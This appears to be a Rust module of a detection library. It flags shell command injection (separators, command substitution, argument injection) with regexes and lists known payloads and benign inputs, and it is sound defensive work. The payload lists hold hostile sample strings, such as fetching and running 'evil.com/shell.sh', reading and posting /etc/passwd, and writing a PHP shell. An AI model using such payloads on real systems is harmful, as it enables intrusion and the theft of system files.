use regex::Regex;
use std::sync::LazyLock;

use crate::classes::{ClassDefinition, decode};
use crate::types::InvariantClass;

static CMD_SEP: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"[;&|`\n\r]\s*(?:cat|ls|id|whoami|pwd|uname|curl|wget|nc|ncat|bash|sh|zsh|python[23]?|perl|ruby|php|powershell|cmd|certutil|bitsadmin|net\s+user|reg\s+query|wmic)\b").unwrap()
});
static PROSE_BACKTICK: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\w{2,}\s+`[^`]+`\s+\w{2,}").unwrap());
static DOLLAR_SUB: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\$\([^)]*(?:cat|ls|id|whoami|uname|curl|wget|bash|sh|python|perl|ruby|php|nc|ncat)[^)]*\)").unwrap()
});
static BACKTICK_SUB: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"`[^`]*(?:cat|ls|id|whoami|uname|curl|wget|bash|sh)[^`]*`").unwrap()
});
static ARG_1: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?:^|\s)--(?:output|exec|post-file|upload-file|config|shell)\b").unwrap()
});
static ARG_2: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?:^|\s)-[oe]\s+(?:/|http)").unwrap());

fn cmd_separator(input: &str) -> bool {
    let d = decode(input);
    CMD_SEP.is_match(&d) && !PROSE_BACKTICK.is_match(&d)
}

fn cmd_substitution(input: &str) -> bool {
    let d = decode(input);
    let has_dollar = DOLLAR_SUB.is_match(&d);
    let has_backtick = BACKTICK_SUB.is_match(&d);
    if !has_dollar && !has_backtick {
        return false;
    }
    if has_backtick && !has_dollar && PROSE_BACKTICK.is_match(&d) {
        return false;
    }
    true
}

fn cmd_argument_injection(input: &str) -> bool {
    let d = decode(input);
    ARG_1.is_match(&d) || ARG_2.is_match(&d)
}

pub const CMD_CLASSES: &[ClassDefinition] = &[
    ClassDefinition {
        id: InvariantClass::CmdSeparator,
        description: "Shell command separators to chain arbitrary command execution",
        detect: cmd_separator,
        known_payloads: &[
            "; id",
            "| cat /etc/passwd",
            "&& whoami",
            "|| uname -a",
            "`id`",
            "; curl evil.com/shell.sh|sh",
        ],
        known_benign: &[
            "hello world",
            "search for items",
            "price & value",
            "cats and dogs",
            "true || false in logic",
        ],
        mitre: &["T1059.004"],
        cwe: Some("CWE-78"),
        formal_property: None,
        composable_with: &[],
    },
    ClassDefinition {
        id: InvariantClass::CmdSubstitution,
        description: "Command substitution syntax to embed command output in another context",
        detect: cmd_substitution,
        known_payloads: &[
            "$(id)",
            "$(cat /etc/passwd)",
            "`whoami`",
            "`curl evil.com/shell.sh`",
        ],
        known_benign: &[
            "$HOME directory",
            "cost is $(price)",
            "backtick `code` here",
            "$(document).ready()",
        ],
        mitre: &["T1059.004"],
        cwe: Some("CWE-78"),
        formal_property: None,
        composable_with: &[],
    },
    ClassDefinition {
        id: InvariantClass::CmdArgumentInjection,
        description: "Inject arguments or flags into commands that accept user-controlled values",
        detect: cmd_argument_injection,
        known_payloads: &[
            "--output=/tmp/pwned",
            "-o /tmp/shell.php",
            "--exec=bash",
            "--post-file=/etc/passwd",
        ],
        known_benign: &[
            "--help",
            "-v",
            "--version",
            "my-file-name.txt",
            "normal argument",
        ],
        mitre: &["T1059.004"],
        cwe: Some("CWE-88"),
        formal_property: None,
        composable_with: &[],
    },
];
